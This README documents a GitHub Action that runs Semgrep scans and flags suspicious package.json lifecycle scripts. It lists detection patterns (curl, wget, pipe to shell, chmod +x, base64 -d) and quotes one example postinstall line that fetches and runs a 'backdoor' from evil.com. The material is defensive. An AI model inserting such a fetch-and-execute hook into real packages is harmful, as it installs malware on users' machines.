# SAST & Supply Chain Scanner

A composite GitHub Action that runs [Semgrep](https://semgrep.dev) SAST scanning and audits `package.json` lifecycle scripts for supply chain attacks.

## Features

- 🔍 **Semgrep SAST** — 1000+ community rules across 30+ languages
- 🔐 **Supply chain audit** — detects malicious `postinstall`/`preinstall` scripts (curl, wget, chmod, /tmp, eval, base64, etc.)
- 📊 **Job Summary** — rich markdown table of findings in the Actions UI
- ⚙️ **Configurable** — custom severity threshold, custom rules, optional supply chain audit
- 📦 **Artifact upload** — JSON results saved on every run

## Usage

```yaml
- uses: actions/checkout@v6

- name: Run SAST Scanner
  uses: your-github-username/sast-action@v1
```

### With options

```yaml
- name: Run SAST Scanner
  uses: your-github-username/sast-action@v1
  with:
    semgrep-config: "p/owasp-top-ten"
    custom-rules-path: ".semgrep/"
    fail-on-severity: "ERROR"
    supply-chain-audit: "true"
    artifact-name: "sast-results"
```

## Inputs

| Input | Description | Default |
|-------|-------------|---------|
| `semgrep-config` | Semgrep ruleset (`auto`, `p/owasp-top-ten`, local path, etc.) | `auto` |
| `custom-rules-path` | Path to your custom Semgrep rules directory | `.semgrep/` |
| `fail-on-severity` | Minimum severity to fail the build (`ERROR`, `WARNING`, `INFO`) | `ERROR` |
| `supply-chain-audit` | Enable `package.json` lifecycle script audit | `true` |
| `artifact-name` | Name of the uploaded results artifact | `semgrep-results` |

## Outputs

| Output | Description |
|--------|-------------|
| `findings-count` | Total number of Semgrep findings |
| `blocking-count` | Findings at or above `fail-on-severity` |
| `supply-chain-findings` | Number of suspicious lifecycle scripts found |

## Detected supply chain patterns

The audit step flags any `preinstall`, `postinstall`, `prepare`, `prepack`, or `postpack` script containing:

| Pattern | Reason |
|---------|--------|
| `curl https://...` | Downloading remote content |
| `wget https://...` | Downloading remote content |
| `\| sh` / `\| bash` | Piping to shell |
| `chmod +x` | Making a file executable |
| `/tmp/` | Writing to temp directory |
| `eval(` | Dynamic code execution |
| `base64 -d` | Possible obfuscation |
| `python3 -c` | Inline Python execution |
| `node -e` | Inline Node execution |
| `exec(` | Process execution |

### Example caught attack

```json
"postinstall": "curl -skL https://evil.com/backdoor -o /tmp/.sshd && chmod +x /tmp/.sshd && /tmp/.sshd &"
```

This fires on 3 patterns: `curl`, `chmod +x`, and `/tmp/`.

## Publishing to the Marketplace

1. Create a new **public** repo named `sast-action`
2. Push this directory's contents to the root of that repo
3. Create a release tag: `git tag v1 && git push origin v1`
4. GitHub will prompt you to publish to the Marketplace from the Releases page

## Repo structure

```
sast-action/
├── action.yml           # composite action definition
├── .semgrep/
│   └── supply-chain.yml # bundled custom Semgrep rules
├── example-workflow.yml # example of how to use this action
└── README.md
```
